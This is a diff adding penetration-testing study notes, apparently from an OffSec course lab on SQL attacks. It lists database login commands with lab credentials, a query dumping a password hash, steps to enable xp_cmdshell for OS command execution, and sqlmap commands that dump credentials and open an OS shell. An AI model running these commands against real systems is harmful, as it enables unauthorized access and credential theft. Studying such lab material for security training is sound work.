@@ -1,0 +1,54 @@
+---SQL Theory and Databases---
++++SQL Theory Refresher
+SELECT * FROM users WHERE user_name='leon'
+
++++DB Types and Characteristics
+$ mysql -u root -p'root' -h 192.168.50.16 -P 3306
+MySQL [(none)]> select version();
+MySQL [(none)]> select system_user();
+MySQL [(none)]> show databases;
+MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
++--------+------------------------------------------------------------------------+
+| user   | authentication_string                                                  |
++--------+------------------------------------------------------------------------+
+| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
++--------+------------------------------------------------------------------------+
+1 row in set (0.106 sec)
+
+We can run impacket-mssqlclient to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. This forces NTLM authentication (as opposed to Kerberos). We'll explore Windows authentication in more depth in upcoming Modules.
+$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
+SQL>select * from offsec.dbo.users;
+
+---Manual SQL Exploitation---
++++Identifying SQLi via Error-based Payloads
+
++++UNION-based Payloads
+
++++Blind SQL Injections
+
+---Manual and Automated Code Execution---
++++Manual Code Execution
+$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+
++++Automating the Attack
+$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+To dump the entire database, including user credentials, we can run the same command as earlier with the --dump parameter.
+$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+
+Next, we can invoke sqlmap with the -r parameter, using our file containing the POST request as an argument. We also need to indicate which parameter is vulnerable to sqlmap, in our case item. Finally, we'll include --os-shell along with the custom writable folder we found earlier.
+$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+
+SQLmap command for login forms
+$ sqlmap -u http://.../login --forms
